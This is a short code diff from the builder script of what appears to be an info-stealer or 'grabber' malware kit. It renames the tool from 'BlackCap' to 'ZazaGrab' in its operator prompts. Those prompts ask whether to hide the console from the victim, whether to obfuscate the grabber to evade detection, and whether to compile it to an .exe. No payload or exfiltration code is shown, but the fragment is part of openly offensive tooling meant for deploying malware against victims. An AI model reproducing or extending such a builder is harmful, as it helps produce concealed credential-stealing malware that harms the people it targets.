@@ -67,13 +67,13 @@ class Builder:
             self.startup = "no"
 
         
-        self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide BlackCap console for victim? (yes/no): ')
+        self.hider = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Hide ZazaGrab console for victim? (yes/no): ')
         if self.hider.lower() == 'yes' or self.hider.lower() == 'y':
             self.hider = "yes"
         else:
             self.hider = False
 
-        self.obfuscation = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the BlackCap (recommand yes)? (yes/no): ')
+        self.obfuscation = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to obfuscate the ZazaGraber (recommand yes)? (yes/no): ')
 
         self.compy = input(f'{Fore.GREEN}[{Fore.RESET}+{Fore.GREEN}]{Fore.RESET} Do you want to compile the file to a .exe? (yes/no): ')
 
